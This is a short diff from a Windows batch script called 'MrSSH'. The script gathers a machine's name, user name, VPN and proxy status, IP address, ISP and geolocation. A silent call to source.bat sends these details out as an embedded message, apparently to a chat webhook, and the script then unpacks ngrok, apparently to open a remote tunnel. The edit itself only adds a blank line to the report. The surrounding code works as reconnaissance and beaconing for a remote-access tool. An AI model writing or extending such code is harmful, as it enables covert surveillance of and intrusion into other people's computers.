@@ -35,7 +35,7 @@ FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter regionName
 FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter Timezone`) DO (SET zone=%%F)
 FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter country`) DO (SET country=%%F)
 
-call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username%" ":bookmark_tabs: __**Security, PC config**__ \\n\\n:desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username% \\n\\n:file_cabinet: **Using VPN?:** %vpn% \\n\\n:map: **Using proxy?:** %proxy% \\n\\n:house:**Ip address:** %local% (%isp%) \\n\\n:bookmark_tabs: __**Location**__ \\n\\n:placard: **Country:** %country% \\n\\n:japan: **Region:** %region% \\n\\n:cityscape: **City:** %city% (%lat%; %lon%) \\n\\n:timer: **Timezone:** %zone%" "52bf90" "https://i.imgur.com/b2Terft.png"
+call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username%" ":bookmark_tabs: __**Security, PC config**__ \\n\\n:desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username% \\n\\n:file_cabinet: **Using VPN?:** %vpn% \\n\\n:map: **Using proxy?:** %proxy% \\n\\n:house:**Ip address:** %local% (%isp%) \\n\\n\\n:bookmark_tabs: __**Location**__ \\n\\n:placard: **Country:** %country% \\n\\n:japan: **Region:** %region% \\n\\n:cityscape: **City:** %city% (%lat%; %lon%) \\n\\n:timer: **Timezone:** %zone%" "52bf90" "https://i.imgur.com/b2Terft.png"
 
 tar -xf ngrok.zip
 
